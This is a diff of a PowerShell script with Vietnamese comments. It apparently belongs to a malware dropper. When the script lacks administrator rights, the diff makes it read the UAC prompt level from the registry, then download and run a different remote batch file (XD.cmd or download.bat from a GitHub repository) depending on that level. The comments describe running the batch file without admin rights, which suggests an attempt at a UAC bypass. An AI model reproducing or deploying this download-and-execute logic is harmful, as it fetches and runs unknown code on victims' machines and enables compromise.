@@ -12,20 +12,24 @@ $skid = "skid"
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     try {
         # Tải xuống tệp batch
-        $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
+        
         $outputFile = "$env:TEMP\download.bat"
         
-        Write-Output "Tải xuống tệp từ $url"
-        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
-
-        # Kiểm tra xem tệp đã được tải xuống thành công không
-        if (-not (Test-Path $outputFile)) {
-            throw "Tệp tải xuống không tồn tại: $outputFile"
-        }
-
         # Thực thi tệp batch mà không cần quyền quản trị
+        # Lấy mức độ thông báo UAC từ registry
+        $uacLevel = Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" | Select-Object -ExpandProperty "ConsentPromptBehaviorAdmin"
+        
+        # Kiểm tra mức độ UAC và in thông báo
+        if ($uacLevel -eq 5 -or $uacLevel -eq 0) {
+            $url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/XD.cmd"
+            Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
+            Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
+        } else {
+            $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
+            Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
+            Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
+        }
         Write-Output "Khởi chạy tệp batch."
-        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
         
         # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
         Write-Output "Kết thúc tiến trình PowerShell."
